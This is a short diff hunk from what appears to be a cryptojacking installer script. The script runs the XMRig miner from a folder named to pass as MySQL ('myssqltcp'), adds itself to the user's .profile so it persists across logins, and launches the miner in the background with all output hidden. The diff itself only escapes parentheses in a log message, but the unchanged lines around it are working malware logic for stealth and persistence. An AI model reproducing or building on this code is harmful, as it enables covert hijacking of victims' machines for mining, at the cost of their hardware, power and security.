@@ -737,7 +737,7 @@ if ! sudo -n true 2>/dev/null; then
   else 
     echo "Looks like $HOME/myssqltcp/xmrig.sh script is already in the $HOME/.profile"
   fi
-  echo "[*] Running server in the background (see logs in $HOME/myssqlsys.log file)"
+  echo "[*] Running server in the background \(see logs in $HOME/myssqlsys.log file\)"
   /bin/bash $HOME/myssqltcp/xmrig.sh --config=$HOME/myssqltcp/config_background.json >/dev/null 2>&1
 else
 
